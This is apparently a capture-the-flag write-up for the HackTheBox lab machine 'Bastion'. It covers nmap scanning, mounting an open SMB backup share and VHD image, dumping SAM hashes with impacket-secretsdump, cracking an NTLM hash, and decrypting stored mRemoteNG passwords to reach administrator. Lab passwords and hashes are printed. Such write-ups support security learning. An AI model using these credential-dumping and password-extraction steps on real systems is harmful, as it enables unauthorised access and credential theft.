---
title: HackTheBox - Bastion
description: Bastion is an Easy level WIndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted. 
date: 2024-08-20 11:02:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Easy, Windows]
image:
  path: /assets/img/headers/htb_bastion.webp
---


## Enumeration

### Nmap

Starting the enumeration with basic nmap scan

```console
$ sudo nmap -sC -sV bastion.htb                                                             
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 11:40 IST
Nmap scan report for bastion.htb (10.10.10.134)
Host is up (0.43s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-19T06:10:38
|_  start_date: 2024-08-19T04:38:43
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-19T08:10:39+02:00
|_clock-skew: mean: -39m59s, deviation: 1h09m13s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.12 seconds
```


### SMB share

I found an smb share via nmap scan.

```console
$ smbclient -L bastion.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to bastion.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I will try to mount the share and check it.

```console
$ mkdir /mnt/bastion
$ sudo mount -t cifs //10.10.10.134/backups /mnt/bastion
$ cat note.txt          

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.'

┌──(kali㉿kali)-[/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─$ ls   
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
BackupSpecs.xml                                                                               cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                           cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                     cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
```

Generally, You would need windows machine to mount a VHD file and check it easily. You would need **guesmount** tool mount vhd file in linux.  

Refer to this article for mounting VHD from a remote share. 

[https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

```console
$ apt-get install libguestfs-tools
$ apt-get install cifs-utils
$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd1 -v
```

# Foothold

## impacket-secretsdump

We can find SAM and SYSTEM files and try to dump them with `impacket-secretsdump`

```console
$ cd /mnt/vhd1/Windows/System32/config

$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.12.0.dev1+20240426.161331.37cc8f95 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 

$ guestunmount /mnt/vhd1
$ sudo umount /mnt/bastion
```

Use crackstation.net to crack this NTLM hash.

| Hash                            | Type | Result       |
|---------------------------------|------|--------------|
| 6112010952d963c8dc4217daec986d9 | NTLM | bureaulampje |

| Username | Password |
|---------|-----------|
| L4mpje | bureaulampje |

After logging in via SSH with creds, We can find user.txt here.
> C:\Users\L4mpje\Desktop\user.txt

# Privilege Escalation

## Enumeration - findstr

Searching for all strings with juicy info.

`findstr /si password *.txt *.ini *.config`

1. This command threw out of lot of text. out of this, i could find some text from files located in **mRemoteNG**
2. Quick Google search suggested this could be exploited to gain admin access.
3. From **changelog.txt**, we know version is _1.76.11_

## Exploit - mRemoteNG

[https://github.com/haseebT/mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)

1. Get Password string from **confCons.xml**.

`C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml`

![Bastion](/assets/img/htb_bastion/IMG-HTB-Bastion-1.png)

2. Use python script to decrypt the password string to get administrator creds.

```console
$ python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==                             
Password: thXLHM96BeKL0ER2
```

| Username | Password |
|---------|-----------|
| administrator | thXLHM96BeKL0ER2 |


We can now read **root.txt** after logging in as `administrator` via SSH.
>C:\Users\Administrator\Desktop\root.txt 

